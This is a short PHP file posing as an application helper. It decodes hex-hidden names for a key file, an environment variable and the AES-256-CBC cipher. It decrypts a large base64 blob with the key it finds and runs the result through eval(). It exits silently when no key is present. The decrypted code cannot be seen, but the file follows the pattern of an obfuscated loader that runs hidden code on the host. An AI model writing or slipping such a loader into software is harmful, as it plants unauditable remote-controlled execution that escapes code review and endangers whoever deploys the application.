<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Mk+4P995urwjoZna3v8x6w==');

$c=base64_decode(

'bG2bNZ6tXSt3+6xsfZAtDWppx0sKYJo9ergJV0faC13WCoIf5LmRd8RXmLiEpuJxWrqJi8W6aHeG' .
'8AQELU+AyL7gFAvYSGAnmQnAdQQvjh/0Ewlc0R6+3MMt0BFhOtDlyMEpIuRv510oskhGQkgocaqm' .
'Z186h3gw4Gtg7LjdXTyI6PUp0wGvDd40uOQb6QZNbZTvJgKIZ+iuubKyT+M/gHCHbx4ygV7F8jle' .
'C/N6rHtbKykp03O8u9fQ7Z812+oUdrlQQjQsFX/WCV0T7GngsS8CuEsHR90SVk1s0WUYpmGczDAT' .
'ORv8upDOpUi9ha2ZRGzXommd0oARFlQ/DEkGwb126Yg/8aAkf49F/w1w7cbawRQN/baML5o2h+YZ' .
'3qbSSYCMXZj3oTIHOAw/B5yYd5O2v5Ky25kcTdbuMu3Vp+qeubQHJmQ3HoRSZQ9zQPZ0K8GWP+zU' .
'DAa5ceG+hmsc7o5Gnbr+5TV64oefLAZPq0hqbIizNgaPpX0NU8IPadXdeB0OF2NXLzXi3wKjpeQM' .
'/453iSkny5PRlDcGWv+TWKRGdKmr7OJUUOwEYKeFUJqFFTb5VsQBeoLubGv9F0zIu1ltKv6LYSps' .
'AiPJg7VJlyH7H/k+B6F6Pr/R8Zu9lgcMUnXmNTxiHbMm8H7ETO1MSSpmjor3DGm65g0BcrV8/cNi' .
'UJCjFEmKlOdgU3dT5qOB++6PWmlgt9dUvOdEb2+7Hq9jBFq40bO7JVQXl1uIvW0QIvqfZdIEm36q' .
'qmxlVN9Z+KuazFdoL9+RagYkSKpi4oEcjFok+b1p1WEWsCOCTdLQNU9bS24BNfOodjSuJWQrWru3' .
'dRRkR6UoYvSw9jxrU52VG+cD/q+DekazbIukBiuc2F8mwpND22Yno+BZCTjbMeGvUD2lM72rTrBF' .
'douw4wYWWGMvEa9bNisK/2fT9BCiQXWNa3soSSZnuZiL9U/lYkFN1vc537/DTUBFrbeSIFMt7Fsz' .
'9oCOjaBMyzN21/qDWED6WmER4UOduNcfpeDeT32VyWhQuCvpBe4sISQO9Dhjdhr07vTs99tn46mn' .
'MbQFyzpuKr0DSsUmdbGmeCxkatRQkjudWhR1eokMSP4g65inTo5as8v+XfaVRLwSRdYnv30O9COu' .
'o1GyT0H4NpzLbICqbpJ5Y4EE28xaq72yt/4qg7Asn2cDCsHXSVt2VxBA0fpkzUR8Z61jXNwYOz7C' .
'sRyO/FA9EYdW5prjsGe4KN5bdpkpdFTYvEa+ZrcMF8L//z5y5PT3aRMD+jkEeExMVNR6JLNdODUo' .
'CJV41aQnpXynBQYpFxbSETsgCzuipJmz6jWr1/bqUsJVTMb7OEkw1woCOy+3n5rPTLNPCUHWUCj5' .
'x0hC8IgNbgbS7r7Lr0bx1VSqxe23wbEeaAeut9xg0jFhFWnxMP/jXWPtjoVifC+h+jJ9/bvkaxKv' .
'b/DbCl64XyRXY9n13e7Jl+Z7QSaq+LnwCD+wKVLulv/ivLNjtezzqGUXsmGBYVSJxMQ2oDLz8hzV' .
'970k7TDpJmv9yOvN6iv0S9golPFf3WlNI4dLk/WS4WS0QyZob9s2UJ9gAl51IbvE20rjTPRo7icJ' .
'0+YHhWxHceGTEG9nqirMz5ohlKqfL+lUAKufMfveaMUGNPYMsCaGbAuvMlAdNaPOcz16gEkoc+9h' .
'd61owhjb6TeiSdD0y3uq+vgQM0Xamj6UQBLoasKK2o+7+m+huvUUj/4VsyJM9SJz7eMdqN8WZLQg' .
'GTayBX1B1TA4z0HO6WzqEESr57MTwqguk8kPw7zIyRokQzc7vH6elnpnAdajYdhJ45V64bVRLcp7' .
'kgkZw9t143TUjAaPaLMya8BZ1/Ryqt38L52YyY5IYw2I5BNPiFLrmBxksYmuNTsFFSetoeY34LJ/' .
'rHjh9fDFWgv8jHUVOttBG9LHWxZmNvAsGUPQXtK8IkPq48ijoanUCRJQXJP4ygMvc/mSeACYMnZn' .
'rH1FkAHg2K2ozC9QUE0Y0FcnQwgaKx/oAYHlKw431TKDGWKCcGll5mSVGXEY8gfPKif1wUfQvu7d' .
'B8Hq4UomRGuhmK3l2BjrpTscnL9WnfP4yvD4K04v1G02e62iQdhv2Tr6bCAKSTL06Mdfv7jmzZcb' .
'xJihEjeoe4PI2NBKsptRr4DpH6q77X6xNhMCq5CeJHS+WKlx'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

